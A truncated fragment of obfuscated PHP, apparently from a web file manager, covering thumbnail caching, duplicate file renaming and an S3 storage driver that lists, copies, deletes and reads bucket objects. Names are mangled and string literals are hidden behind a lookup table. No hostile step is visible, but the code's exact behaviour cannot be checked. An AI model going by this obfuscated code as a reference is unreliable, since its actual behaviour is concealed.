$‘ŠÖù– = $­­¤–ÑÊ; $±ìŒ‘Öò = $‘ŠÖù–[$÷¸Úüã½[184]]; if ($±ìŒ‘Öò && isset($±ìŒ‘Öò[$÷¸Úüã½[185]])) { if ($±ìŒ‘Öò[$÷¸Úüã½[185]] <= $–æ­œÆ“ && $±ìŒ‘Öò[$÷¸Úüã½[186]] <= $–æ­œÆ“) { $­Ç÷ğˆ‘ = !0; } } } if ($‘ŠÖù–[$÷¸Úüã½[79]] <= 1024 * 50 || $­Ç÷ğˆ‘ || !function_exists($÷¸Úüã½[187]) || $‘ŠÖù–[$÷¸Úüã½[169]] == $÷¸Úüã½[188]) { return $this->fileOut($¼Ôş×ı, !1, $‘ŠÖù–[$÷¸Úüã½[32]]); } $ğ²ä†œ– = kodIO::hashPath($‘ŠÖù–); $‹ó…Ê = "\x63\x6f\166\x65\x72\x5f{$ğ²ä†œ–}\x5f{$–æ­œÆ“}\x2e\x70\156\x67"; $œ­å©æì = IO_PATH_SYSTEM_TEMP . $÷¸Úüã½[189]; $‚×„İœú = IO::infoFullSimple($œ­å©æì); $ç­Ú‹¾ï = $‚×„İœú && is_array($‚×„İœú) ? $‚×„İœú[$÷¸Úüã½[87]] : $÷¸Úüã½[12]; if (!$ç­Ú‹¾ï) { $ç­Ú‹¾ï = IO::mkdir($œ­å©æì); } if ($‘ŠÖù–[$÷¸Úüã½[190]] == $÷¸Úüã½[191] && isset($‘ŠÖù–[$÷¸Úüã½[192]]) && $‘ŠÖù–[$÷¸Úüã½[192]] == kodIO::sourceID($ç­Ú‹¾ï)) { $¯±±¡ªÚ = $‘ŠÖù–[$÷¸Úüã½[193]]; if ($–æ­œÆ“ <= 500) { $è½¾”…Û = preg_replace($÷¸Úüã½[194], $÷¸Úüã½[195], $‘ŠÖù–[$÷¸Úüã½[32]]); $¯±±¡ªÚ = IO::fileNameExist($ç­Ú‹¾ï, $è½¾”…Û); } return IO::fileOut(KodIO::make($¯±±¡ªÚ), !1, $‘ŠÖù–[$÷¸Úüã½[32]]); } $ÍÀ…šçÏ = IO::fileNameExist($ç­Ú‹¾ï, $‹ó…Ê); if ($ÍÀ…šçÏ) { return IO::fileOut(KodIO::make($ÍÀ…šçÏ), !1, $‘ŠÖù–[$÷¸Úüã½[32]]); } if ($–æ­œÆ“ > 1000) { $this->makeImageCover($ç­Ú‹¾ï, $¼Ôş×ı, $‹ó…Ê, $–æ­œÆ“); $this->makeImageCover($ç­Ú‹¾ï, $¼Ôş×ı, "\x63\x6f\166\x65\x72\137{$ğ²ä†œ–}\137\62\x35\x30\x2e\x70\156\x67", 250); $ÍÀ…šçÏ = IO::fileNameExist($ç­Ú‹¾ï, $‹ó…Ê); if ($ÍÀ…šçÏ) { return IO::fileOut(KodIO::make($ÍÀ…šçÏ), !1, $‘ŠÖù–[$÷¸Úüã½[32]]); } die; } if (!kodIO::allowCover($‘ŠÖù–)) { return $this->fileOut($¼Ôş×ı, !1, $‘ŠÖù–[$÷¸Úüã½[32]]); } $Ş¸åé¹è = Cache::get($‹ó…Ê); if ($Ş¸åé¹è == $÷¸Úüã½[196] || $Ş¸åé¹è == $÷¸Úüã½[197]) { echo $Ş¸åé¹è; die; } Cache::set($‹ó…Ê, $÷¸Úüã½[197], 60); $şàûÊÑ = array($ç­Ú‹¾ï, $‘ŠÖù–[$÷¸Úüã½[87]], $‹ó…Ê, $–æ­œÆ“); $¸—ÁŸâ = $÷¸Úüã½[198] . $‘ŠÖù–[$÷¸Úüã½[79]] . $÷¸Úüã½[199] . $‹ó…Ê . $÷¸Úüã½[200] . $‘ŠÖù–[$÷¸Úüã½[32]] . $÷¸Úüã½[201] . $‘ŠÖù–[$÷¸Úüã½[87]]; TaskQueue::add($÷¸Úüã½[202], $şàûÊÑ, $¸—ÁŸâ, $‹ó…Ê); } public function makeImageCover($ÄÈ¶²ò”, $Õ‡­ƒØ½, $£İ ‚œÜ, $Å²¾·Ï) { $Áµğ‹½× =& $_SERVER[‹è™Ü¸Ñ]; if (IO::fileNameExist($ÄÈ¶²ò”, $£İ ‚œÜ)) { return $Áµğ‹½×[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Üûæ«é¶ = DATA_THUMB . $£İ ‚œÜ; del_file($Üûæ«é¶); $óš›ñ¬Š = IO::copy($Õ‡­ƒØ½, TEMP_FILES, !1, $£İ ‚œÜ); if (!@file_exists($óš›ñ¬Š)) { return $Áµğ‹½×[204]; } ImageThumb::createThumb($óš›ñ¬Š, $Üûæ«é¶, $Å²¾·Ï, $Å²¾·Ï * 10); if (@file_exists($Üûæ«é¶)) { Cache::remove($£İ ‚œÜ); return IO::move($Üûæ«é¶, $ÄÈ¶²ò”); } Cache::set($£İ ‚œÜ, $Áµğ‹½×[196], 600); del_file($Üûæ«é¶); return $Áµğ‹½×[205] . $óš›ñ¬Š . $Áµğ‹½×[74]; } public function fileOutImageServer($²ÅˆÄÉï, $’ÅİÍËö = 250) { $this->fileOutImage($²ÅˆÄÉï, $’ÅİÍËö); } public function fileNameAuto($íæèÏÀ², $êÑßşÑ, $è§ÌÕ†œ = REPEAT_RENAME, $™ƒàÚÉ¾ = false) { $¼üÎÅíà =& $_SERVER[‹è™Ü¸Ñ]; $ŸĞ¸ÒÑ = $íæèÏÀ² === $¼üÎÅíà[12] ? $êÑßşÑ : rtrim($íæèÏÀ², $¼üÎÅíà[8]) . $¼üÎÅíà[8] . $êÑßşÑ; if ($è§ÌÕ†œ == REPEAT_REPLACE || !$this->exist($ŸĞ¸ÒÑ) || $™ƒàÚÉ¾ && $è§ÌÕ†œ != REPEAT_RENAME_FOLDER) { return $êÑßşÑ; } if ($è§ÌÕ†œ == REPEAT_SKIP) { return !1; } $ºì˜Å÷ = $¼üÎÅíà[10] . get_path_ext($êÑßşÑ); $ºì˜Å÷ = $ºì˜Å÷ == $¼üÎÅíà[10] || $™ƒàÚÉ¾ ? $¼üÎÅíà[12] : $ºì˜Å÷; $ŸîòÍœ = 1; $İÆ›´û„ = substr($êÑßşÑ, 0, strlen($êÑßşÑ) - strlen($ºì˜Å÷)); $˜®ğ‘¡ = $İÆ›´û„ . "\50{$ŸîòÍœ}\51{$ºì˜Å÷}"; while ($this->exist(rtrim($íæèÏÀ², $¼üÎÅíà[8]) . $¼üÎÅíà[8] . $˜®ğ‘¡)) { $˜®ğ‘¡ = $İÆ›´û„ . "\50{$ŸîòÍœ}\51{$ºì˜Å÷}"; $ŸîòÍœ++; } return $˜®ğ‘¡; } private function fileNameAutoList($óÕÏ¹èŒ, $Ñë…áÑØ, $® ¸†ñå = false) { $ˆİØé–ê =& $_SERVER[‹è™Ü¸Ñ]; $£Ö×¯ÃŸ = $this->listPath($óÕÏ¹èŒ, !0); $£Ö×¯ÃŸ = array_merge($£Ö×¯ÃŸ[$ˆİØé–ê[85]], $£Ö×¯ÃŸ[$ˆİØé–ê[86]]); $Ûö¹Ò‹Œ = array_to_keyvalue($£Ö×¯ÃŸ, $ˆİØé–ê[12], $ˆİØé–ê[32]); $ÈÎÏï¾® = $ˆİØé–ê[10] . get_path_ext($Ñë…áÑØ); $ÈÎÏï¾® = $ÈÎÏï¾® == $ˆİØé–ê[10] || $® ¸†ñå ? $ˆİØé–ê[12] : $ÈÎÏï¾®; $Î±ïÖŠÛ = substr($Ñë…áÑØ, 0, strlen($Ñë…áÑØ) - strlen($ÈÎÏï¾®)); $¯Î‡ı¾Î = $Î±ïÖŠÛ . "\50\x30\51{$ÈÎÏï¾®}"; for ($–ßıâ–Ï = 1; $–ßıâ–Ï <= count($Ûö¹Ò‹Œ) + 1; $–ßıâ–Ï++) { $¯Î‡ı¾Î = $Î±ïÖŠÛ . "\x28{$–ßıâ–Ï}\x29{$ÈÎÏï¾®}"; if (!in_array_not_case($¯Î‡ı¾Î, $Ûö¹Ò‹Œ)) { return $¯Î‡ı¾Î; } } return $¯Î‡ı¾Î; } public function listAllFiles($’Óòüğ‰, $»®¥±Ë‰) { $‰¯ĞŞ³û =& $_SERVER[‹è™Ü¸Ñ]; if (empty($»®¥±Ë‰)) { return array(); } $ñ¬û È = array_keys($»®¥±Ë‰); $Şù‰ÂÜ½ = array(); $’Óòüğ‰ = trim($’Óòüğ‰, $‰¯ĞŞ³û[8]); foreach ($»®¥±Ë‰ as $–ô®…‚ => $äà’¼ú‚) { $Ü·àåë = ltrim(substr(trim($–ô®…‚, $‰¯ĞŞ³û[8]), strlen($’Óòüğ‰)), $‰¯ĞŞ³û[8]); if (substr($–ô®…‚, -1) == $‰¯ĞŞ³û[8]) { $Ü·àåë = rtrim($Ü·àåë, $‰¯ĞŞ³û[8]) . $‰¯ĞŞ³û[8]; } $Şù‰ÂÜ½ = array_merge($Şù‰ÂÜ½, $this->slicePath($Ü·àåë)); } $ï½šå§† = array(); foreach (array_unique($Şù‰ÂÜ½) as $šŸ¤—Ú) { $¸«êŸß€ = array($‰¯ĞŞ³û[87] => $this->getPathOuter($‰¯ĞŞ³û[8] . $’Óòüğ‰ . $‰¯ĞŞ³û[8] . $šŸ¤—Ú), $‰¯ĞŞ³û[78] => 1, $‰¯ĞŞ³û[79] => 0); if (substr($šŸ¤—Ú, -1) != $‰¯ĞŞ³û[8]) { $¸«êŸß€[$‰¯ĞŞ³û[78]] = 0; $ÏƒãïÕÅ = $this->getPath($’Óòüğ‰ . $‰¯ĞŞ³û[8] . $šŸ¤—Ú); if (isset($»®¥±Ë‰[$ÏƒãïÕÅ])) { $ò¾«ù­® = $»®¥±Ë‰[$ÏƒãïÕÅ]; if (isset($ò¾«ù­®[$‰¯ĞŞ³û[79]])) { $¸«êŸß€[$‰¯ĞŞ³û[79]] = intval($ò¾«ù­®[$‰¯ĞŞ³û[79]]); } if (isset($ò¾«ù­®[$‰¯ĞŞ³û[206]])) { $¸«êŸß€[$‰¯ĞŞ³û[88]] = intval($ò¾«ù­®[$‰¯ĞŞ³û[206]]); } } } $ï½šå§†[] = $¸«êŸß€; } return $ï½šå§†; } public function slicePath($şÚµÂË¦) { $€ÍˆÙÍÉ =& $_SERVER[‹è™Ü¸Ñ]; $ã‰…Ê¡Ó = explode($€ÍˆÙÍÉ[8], trim($şÚµÂË¦, $€ÍˆÙÍÉ[8])); $¦ªÊ”Ñ‰ = 0; do { ++$¦ªÊ”Ñ‰; $”åîƒ«Õ[] = implode($€ÍˆÙÍÉ[8], array_slice($ã‰…Ê¡Ó, 0, $¦ªÊ”Ñ‰)) . $€ÍˆÙÍÉ[8]; } while ($¦ªÊ”Ñ‰ < count($ã‰…Ê¡Ó)); $”åîƒ«Õ[count($ã‰…Ê¡Ó) - 1] = $şÚµÂË¦; return $”åîƒ«Õ; } public function getHost() { $Àû´çã¨ =& $_SERVER[‹è™Ü¸Ñ]; $æİ¶ÅÒè = parse_url(trim($this->domain, $Àû´çã¨[8])); $ÁŸû×¥ = isset($æİ¶ÅÒè[$Àû´çã¨[207]]) ? $æİ¶ÅÒè[$Àû´çã¨[207]] : http_type(); $üã ê û = isset($æİ¶ÅÒè[$Àû´çã¨[208]]) ? $æİ¶ÅÒè[$Àû´çã¨[208]] : $æİ¶ÅÒè[$Àû´çã¨[87]]; if (isset($æİ¶ÅÒè[$Àû´çã¨[209]])) { $üã ê û .= $Àû´çã¨[4] . $æİ¶ÅÒè[$Àû´çã¨[209]]; } return $ÁŸû×¥ . $Àû´çã¨[210] . $üã ê û; } public function pathEncode($œ‡¶°»…) { $§¼›¹ÂÌ =& $_SERVER[‹è™Ü¸Ñ]; return str_replace($§¼›¹ÂÌ[211], $§¼›¹ÂÌ[8], rawurlencode($œ‡¶°»…)); } public function writeLog($ëã¹ìƒ = '', $üŠÌíç = false) { $”¯÷ç÷Ç =& $_SERVER[‹è™Ü¸Ñ]; $÷÷Öâ¹ = in_array(ACTION, array($”¯÷ç÷Ç[212], $”¯÷ç÷Ç[213])); if (!$÷÷Öâ¹ && !GLOBAL_DEBUG) { return; } $Ø¬ÆµäÂ = $ëã¹ìƒ; static $§”‚Öß‚ = null; if (!$§”‚Öß‚) { $§”‚Öß‚ = strtoupper($this->getType()); } $ëã¹ìƒ = $§”‚Öß‚ . $”¯÷ç÷Ç[214] . $ëã¹ìƒ; if ($üŠÌíç) { $ğªù¼€• = error_get_last(); if ($ğªù¼€•) { $ëã¹ìƒ = array($ëã¹ìƒ, $ğªù¼€•); } } write_log($ëã¹ìƒ, $”¯÷ç÷Ç[215]); if ($÷÷Öâ¹) { throw new Exception($Ø¬ÆµäÂ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ß¸î‡ØÚ) { set_timeout(); require_once SDK_DIR . $_SERVER[‹è™Ü¸Ñ][216]; parent::__construct(); $this->_init($ß¸î‡ØÚ); } public function _init($¯£ÕØ„‰) { $ºä §–¹ =& $_SERVER[‹è™Ü¸Ñ]; $this->config = $¯£ÕØ„‰; foreach ($¯£ÕØ„‰ as $Ğ«µá‡Ã => $ôğõ€¡„) { if (isset($this->{$Ğ«µá‡Ã})) { $this->{$Ğ«µá‡Ã} = $ôğõ€¡„; } } $this->endpoint = $¯£ÕØ„‰[$ºä §–¹[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ºä §–¹[212], $ºä §–¹[213]))) { $this->client->setExceptions(); } } public function setSignVersion($ÕÈùÅø¥ = "\x76\x34") { $this->signVer = $ÕÈùÅø¥; $this->client->setSignatureVersion($ÕÈùÅø¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ñ²Ğ) { return null; } } public function isBucketCors() { $ëã²¶Œü =& $_SERVER[‹è™Ü¸Ñ]; $èƒ©¤ô¯ = $this->getBucketCors(); if (!$èƒ©¤ô¯ || !is_array($èƒ©¤ô¯)) { return !1; } if (!is_array($èƒ©¤ô¯[$ëã²¶Œü[218]])) { $èƒ©¤ô¯[$ëã²¶Œü[218]] = explode($ëã²¶Œü[50], $èƒ©¤ô¯[$ëã²¶Œü[218]]); } if ($èƒ©¤ô¯[$ëã²¶Œü[219]] != $ëã²¶Œü[220] || !in_array($ëã²¶Œü[220], $èƒ©¤ô¯[$ëã²¶Œü[218]])) { return !1; } $ƒ¾ı¤Ÿ  = array_map($ëã²¶Œü[221], $èƒ©¤ô¯[$ëã²¶Œü[222]]); if (!is_array($ƒ¾ı¤Ÿ )) { $ƒ¾ı¤Ÿ  = array(); } $Çş´Åì = array($ëã²¶Œü[223], $ëã²¶Œü[224], $ëã²¶Œü[225], $ëã²¶Œü[226], $ëã²¶Œü[227]); $Üüş ¢ò = array_diff($Çş´Åì, $ƒ¾ı¤Ÿ ); return empty($Üüş ¢ò); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ŸÓÂş®°, $–Ø²¤ø£ = '', $³ÑÚ¥Ú˜ = REPEAT_RENAME) { $ÇÏ×É‡Á = $this->setContent($ŸÓÂş®°, $–Ø²¤ø£); if ($ÇÏ×É‡Á !== !1) { return $this->getPathOuter($ŸÓÂş®°); } return !1; } public function mkdir($æŠ‹¥ËŒ, $„Ÿ°ø§Û = REPEAT_SKIP) { $‡ŸŠà© =& $_SERVER[‹è™Ü¸Ñ]; if (empty($æŠ‹¥ËŒ) && $æŠ‹¥ËŒ !== $‡ŸŠà©[228]) { return !1; } if ($„Ÿ°ø§Û && $this->_isFolder($æŠ‹¥ËŒ)) { return $this->getPathOuter($æŠ‹¥ËŒ); } $şÖæ¬Øù = $this->setContent($æŠ‹¥ËŒ, $‡ŸŠà©[12], !0); if ($şÖæ¬Øù !== !1) { return $this->getPathOuter($æŠ‹¥ËŒ); } return !1; } public function copyFile($ÌìÁ†Öó, $ „•ğ÷‚, $¢¤ÅâÓÂ = array()) { $†‰ïÂ— =& $_SERVER[‹è™Ü¸Ñ]; $äŞú›ô = $this->objectMeta($ÌìÁ†Öó); if (!$äŞú›ô) { return !1; } if ($äŞú›ô[$†‰ïÂ—[79]] <= 1024 * 1024 * 200) { $ıÎ©€öÖ = $this->client->copyObject($this->bucket, $ÌìÁ†Öó, $this->bucket, $ „•ğ÷‚, $†‰ïÂ—[229], $¢¤ÅâÓÂ); } else { $ıÎ©€öÖ = $this->client->multiCopyObject($this->bucket, $ÌìÁ†Öó, $this->bucket, $ „•ğ÷‚, $¢¤ÅâÓÂ); } $ıÎ©€öÖ = $ıÎ©€öÖ ? $this->getPathOuter($ „•ğ÷‚) : !1; return $ıÎ©€öÖ; } public function moveFile($Í³õª–®, $»ÓË€–¸) { if ($this->copyFile($Í³õª–®, $»ÓË€–¸)) { $this->delFile($Í³õª–®); return $this->getPathOuter($»ÓË€–¸); } return !1; } public function delFile($‚½ ½ÓÅ) { return $this->client->deleteObject($this->bucket, $‚½ ½ÓÅ); } public function delFolder($€€Ëî±Æ) { $“Á‘‰ôÕ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->exist($€€Ëî±Æ)) { return !0; } $this->listItemCache = !1; $ËÁî²Úš = $this->fileList($€€Ëî±Æ); $this->listItemCache = !0; $ˆÚ»½Íõ = trim($€€Ëî±Æ, $“Á‘‰ôÕ[8]) . $“Á‘‰ôÕ[8]; if (!empty($€€Ëî±Æ) && $€€Ëî±Æ !== $“Á‘‰ôÕ[228] && !in_array($ˆÚ»½Íõ, $ËÁî²Úš[$“Á‘‰ôÕ[85]])) { $ËÁî²Úš[$“Á‘‰ôÕ[85]][] = $ˆÚ»½Íõ; } $ïÎÃıâ” = $this->delByBatch($ËÁî²Úš[$“Á‘‰ôÕ[86]]); if (!$ïÎÃıâ”) { return !1; } $ïÎÃıâ” = $this->delByBatch($ËÁî²Úš[$“Á‘‰ôÕ[85]]); if (!$ïÎÃıâ”) { return !1; } return $this->delFile($ˆÚ»½Íõ); } private function delByBatch($·ÔãÕ¦€) { foreach (array_chunk($·ÔãÕ¦€, 1000) as $§Ÿ·¬²) { $´¹¤ùå› = $this->client->deleteObjects($this->bucket, $§Ÿ·¬²); if (!$´¹¤ùå›) { return !1; } } return !0; } public function rename($áŞ¦§îÁ, $ÀÇ÷—ß) { return $this->renameObject($áŞ¦§îÁ, $ÀÇ÷—ß); } public function listPath($ÅĞÎ¹ÁÃ, $ÒÀ÷Â¨¤ = false) { $¿İŠô¦õ =& $_SERVER[‹è™Ü¸Ñ]; $ŸŞêíå“ = $this->fileList($ÅĞÎ¹ÁÃ, $¿İŠô¦õ[8], !0); foreach ($ŸŞêíå“[$¿İŠô¦õ[85]] as $øŞªíí¦ => $ŞØß¾±Ğ) { $ŸŞêíå“[$¿İŠô¦õ[85]][$øŞªíí¦] = $this->folderInfo($ŞØß¾±Ğ, $ÒÀ÷Â¨¤, $ŞØß¾±Ğ); } foreach ($ŸŞêíå“[$¿İŠô¦õ[86]] as $øŞªíí¦ => $ŞØß¾±Ğ) { $ŸŞêíå“[$¿İŠô¦õ[86]][$øŞªíí¦] = $this->fileInfo($ŞØß¾±Ğ[$¿İŠô¦õ[32]], $ÒÀ÷Â¨¤, $ŞØß¾±Ğ); } return $ŸŞêíå“; } protected function infoChildren($äòû¦Çå, &$¹Ì“Ò¸) { $ƒ³¬ó›Ø =& $_SERVER[‹è™Ü¸Ñ]; $¿¾ªâ™« = $this->fileList($äòû¦Çå, $ƒ³¬ó›Ø[12], !0); $¹Ì“Ò¸[$ƒ³¬ó›Ø[81]] += count($¿¾ªâ™«[$ƒ³¬ó›Ø[85]]); $¹Ì“Ò¸[$ƒ³¬ó›Ø[80]] += count($¿¾ªâ™«[$ƒ³¬ó›Ø[86]]); foreach ($¿¾ªâ™«[$ƒ³¬ó›Ø[86]] as $Çâ’Ş) { if (!$Çâ’Ş || !$Çâ’Ş[$ƒ³¬ó›Ø[79]]) { continue; } $¹Ì“Ò¸[$ƒ³¬ó›Ø[79]] += $Çâ’Ş[$ƒ³¬ó›Ø[79]]; } } private function fileInfo($ıÚÍœÔ, $Õ›ŠŸÇ = false, $Ğ¬¥å® = array()) { $ú£•öÚ± =& $_SERVER[‹è™Ü¸Ñ]; $´˜û·Ôë = array($ú£•öÚ±[32] => $this->pathThis($ıÚÍœÔ), $ú£•öÚ±[87] => $this->getPathOuter($ıÚÍœÔ), $ú£•öÚ±[33] => $ú£•öÚ±[230], $ú£•öÚ±[169] => $this->ext($ıÚÍœÔ), $ú£•öÚ±[79] => isset($Ğ¬¥å®[$ú£•öÚ±[79]]) ? $Ğ¬¥å®[$ú£•öÚ±[79]] : 0); if ($Õ›ŠŸÇ) { return $´˜û·Ôë; } $´˜û·Ôë[$ú£•öÚ±[231]] = $´˜û·Ôë[$ú£•öÚ±[88]] = 0; $´˜û·Ôë[$ú£•öÚ±[232]] = $´˜û·Ôë[$ú£•öÚ±[233]] = !0; if (empty($Ğ¬¥å®)) { $Ğ¬¥å® = $this->objectMeta($ıÚÍœÔ); if (!$Ğ¬¥å®) { return $´˜û·Ôë; } } if (isset($Ğ¬¥å®[$ú£•öÚ±[234]]) && $Ğ¬¥å®[$ú£•öÚ±[234]]) { $´˜û·Ôë[$ú£•öÚ±[235]] = $Ğ¬¥å®[$ú£•öÚ±[234]]; } if (isset($Ğ¬¥å®[$ú£•öÚ±[206]])) { $´˜û·Ôë[$ú£•öÚ±[88]] = $Ğ¬¥å®[$ú£•öÚ±[206]]; } if (isset($Ğ¬¥å®[$ú£•öÚ±[79]])) { $´˜û·Ôë[$ú£•öÚ±[79]] = $Ğ¬¥å®[$ú£•öÚ±[79]]; } return $´˜û·Ôë; } private function folderInfo($É‡¿Àş, $ô´€×‘± = false, $ûÃœ«ó = array()) { $õ“­µÔÅ =& $_SERVER[‹è™Ü¸Ñ]; $ˆó¶«ñÒ = array($õ“­µÔÅ[32] => $this->pathThis($É‡¿Àş), $õ“­µÔÅ[87] => $this->getPathOuter($õ“­µÔÅ[8] . $É‡¿Àş), $õ“­µÔÅ[33] => $õ“­µÔÅ[78]); if ($ô´€×‘±) { return $ˆó¶«ñÒ; } $ˆó¶«ñÒ[$õ“­µÔÅ[231]] = $ˆó¶«ñÒ[$õ“­µÔÅ[88]] = 0; $ˆó¶«ñÒ[$õ“­µÔÅ[232]] = $ˆó¶«ñÒ[$õ“­µÔÅ[233]] = !0; if ($É‡¿Àş == $õ“­µÔÅ[12]) { return $ˆó¶«ñÒ; } if (empty($ûÃœ«ó)) { $ûÃœ«ó = $this->objectMeta(trim($É‡¿Àş, $õ“­µÔÅ[8]) . $õ“­µÔÅ[8]); } if (isset($ûÃœ«ó[$õ“­µÔÅ[206]])) { $ˆó¶«ñÒ[$õ“­µÔÅ[231]] = $ûÃœ«ó[$õ“­µÔÅ[206]]; } return $ˆó¶«ñÒ; } private function fileList($»Ö«¿í×, $‘Îº€‰° = '', $´Âú•ª„ = 0) { $òÎÂÆ»± =& $_SERVER[‹è™Ü¸Ñ]; $üÙ÷˜° = rtrim($»Ö«¿í×, $òÎÂÆ»±[8]) . $òÎÂÆ»±[8]; $©„Ò ù» = $this->listObjs($üÙ÷˜°, null, null, $‘Îº€‰°); if (!$©„Ò ù») { return array($òÎÂÆ»±[85] => array(), $òÎÂÆ»±[86] => array()); } $®É’£­ö = $Êæ‘¢–µ = array(); foreach ($©„Ò ù»[$òÎÂÆ»±[236]] as $Ï›™øîÁ) { $´åŠë¥Ô = $Ï›™øîÁ[$òÎÂÆ»±[32]]; if ($´åŠë¥Ô == $üÙ÷˜°) { continue; } $Ãå¹İƒ = isset($Ï›™øîÁ[$òÎÂÆ»±[79]]) ? $Ï›™øîÁ[$òÎÂÆ»±[79]] : 0; $À“ÀÉùª = $Ãå¹İƒ == 0 && substr($´åŠë¥Ô, strlen($´åŠë¥Ô) - 1, 1) == $òÎÂÆ»±[8] ? !0 : !1; $this->cacheMethodInfoSet($´åŠë¥Ô, $À“ÀÉùª, $Ï›™øîÁ); if ($À“ÀÉùª) { $®É’£­ö[] = $´åŠë¥Ô; continue; } $Êæ‘¢–µ[] = $´Âú•ª„ ? $Ï›™øîÁ : $´åŠë¥Ô; } foreach ($©„Ò ù»[$òÎÂÆ»±[237]] as $Ï›™øîÁ) { $®É’£­ö[] = $Ï›™øîÁ[$òÎÂÆ»±[32]]; $this->cacheMethodInfoSet($Ï›™øîÁ[$òÎÂÆ»±[32]], !0); } $this->cacheMethodInfoSet($»Ö«¿í×, !0); return array($òÎÂÆ»±[85] => $®É’£­ö, $òÎÂÆ»±[86] => $Êæ‘¢–µ); } private function listObjs($ÑÃ™Äı’, $ôµ¤¬âÕ = null, $²Í“—  = null, $–•äæå¬ = null) { $•ášËÌû =& $_SERVER[‹è™Ü¸Ñ]; $ÑÃ™Äı’ = trim($ÑÃ™Äı’, $•ášËÌû[8]); $ÖØ˜æÔ = empty($ÑÃ™Äı’) && $ÑÃ™Äı’ !== $•ášËÌû[228] ? $•ášËÌû[12] : $ÑÃ™Äı’ . $•ášËÌû[8]; return $this->client->getBucket($this->bucket, $ÖØ˜æÔ, $ôµ¤¬âÕ, $²Í“— , $–•äæå¬, !0); } public function has($ŒÈ±Å¬, $Ïï†õöÏ = false, $Éª«û‹Ø = true) { $ùÆôÓ°Î =& $_SERVER[‹è™Ü¸Ñ]; $ŒÈ±Å¬ = trim($ŒÈ±Å¬, $ùÆôÓ°Î[8]); $öİ‘Ò‡ = empty($ŒÈ±Å¬) && $ŒÈ±Å¬ !== $ùÆôÓ°Î[228] ? $ùÆôÓ°Î[12] : $ŒÈ±Å¬ . $ùÆôÓ°Î[8]; $­·ìè•â = null; $†ë”ï = 500; $åıò…ñ® = $ùÆôÓ°Î[8]; $Ù´µÍ…³ = $Æ»ƒÚç£ = array(); while (!0) { $Ê³Š¸×Ä = $this->listObjs($ŒÈ±Å¬, $­·ìè•â, $†ë”ï, $åıò…ñ®); if (!$Ê³Š¸×Ä) { break; } $­·ìè•â = $Ê³Š¸×Ä[$ùÆôÓ°Î[238]]; $¬ß§¡ = $Ê³Š¸×Ä[$ùÆôÓ°Î[236]]; $ùàïÖÄÀ = $Ê³Š¸×Ä[$ùÆôÓ°Î[237]]; if (empty($¬ß§¡) && empty($ùàïÖÄÀ)) { break; } if (count($¬ß§¡) == 1 && $¬ß§¡[0][$ùÆôÓ°Î[32]] == $öİ‘Ò‡) { break; } if ($Ïï†õöÏ) { if (count($¬ß§¡)) { $¬ß§¡ = array_column($¬ß§¡, $ùÆôÓ°Î[32]); $Ù´µÍ…³ = array_merge($Ù´µÍ…³, $¬ß§¡); } if (count($ùàïÖÄÀ)) { $ùàïÖÄÀ = array_column($ùàïÖÄÀ, $ùÆôÓ°Î[32]); $Æ»ƒÚç£ = array_merge($Æ»ƒÚç£, $ùàïÖÄÀ); } if ($­·ìè•â === null) { break; } continue; } if ($Éª«û‹Ø) { if (!empty($¬ß§¡)) { if (count($¬ß§¡) > 1 || isset($¬ß§¡[0][$ùÆôÓ°Î[32]]) && $¬ß§¡[0][$ùÆôÓ°Î[32]] != $öİ‘Ò‡) { return !0; } } } else { if (!empty($ùàïÖÄÀ)) { return !0; } } if ($­·ìè•â === null) { break; } } if ($Ïï†õöÏ) { $Ù´µÍ…³ = array_diff($Ù´µÍ…³, array($öİ‘Ò‡)); $Ù´µÍ…³ = count(array_unique($Ù´µÍ…³)); $Æ»ƒÚç£ = count(array_unique($Æ»ƒÚç£)); return array($ùÆôÓ°Î[239] => $Ù´µÍ…³, $ùÆôÓ°Î[240] => $Æ»ƒÚç£); } return !1; } public function listAll($ª½æ×ğÕ) { $êù‹ÍÂ˜ =& $_SERVER[‹è™Ü¸Ñ]; $¢…ô–÷Ø = $this->fileList($ª½æ×ğÕ, $êù‹ÍÂ˜[12], !0); $Èô¯³Û = array_to_keyvalue($¢…ô–÷Ø[$êù‹ÍÂ˜[86]], $êù‹ÍÂ˜[32]); foreach ($¢…ô–÷Ø[$êù‹ÍÂ˜[85]] as $ÛóûÀé) { if (is_string($ÛóûÀé)) { $Èô¯³Û[$ÛóûÀé] = array($êù‹ÍÂ˜[79] => 0); } } return $this->listAllFiles($ª½æ×ğÕ, $Èô¯³Û); } public function canRead($¿à¼ÑÂË) { $üÎæâŸû =& $_SERVER[‹è™Ü¸Ñ]; $¹ºÂõùö = $this->client->getAccessControlPolicy($this->bucket, $¿à¼ÑÂË); if (!$¹ºÂõùö) { return !1; } return in_array($¹ºÂõùö, array($üÎæâŸû[241], $üÎæâŸû[242], $üÎæâŸû[243])) ? !0 : !1; } public function canWrite($é’Âšºç) { $ÉöøÒ†ö =& $_SERVER[‹è™Ü¸Ñ]; $ç½ÄçÌ  = $this->client->getAccessControlPolicy($this->bucket, $é’Âšºç); if (!$ç½ÄçÌ ) { return !1; } return in_array($ç½ÄçÌ , array($ÉöøÒ†ö[241], $ÉöøÒ†ö[242])) ? !0 : !1; } public function getContent($Íâüé) { return $this->client->getObject($this->bucket, $Íâüé); } public function setContent($Áü°Íºü, $œÌ©ò£… = '', $¼„·Î = false) { $åÏÑ¹™ä =& $_SERVER[‹è™Ü¸Ñ]; $Áü°Íºü = $¼„·Î ? trim($Áü°Íºü, $åÏÑ¹™ä[8]) . $åÏÑ¹™ä[8] : $Áü°Íºü; $âó­ã´µ = get_file_mime(get_path_ext($Áü°Íºü)); $¶‘ÆòĞî = $this->client->putObject($œÌ©ò£…, $this->bucket, $Áü°Íºü, $åÏÑ¹™ä[229], array(), $âó­ã´µ); if 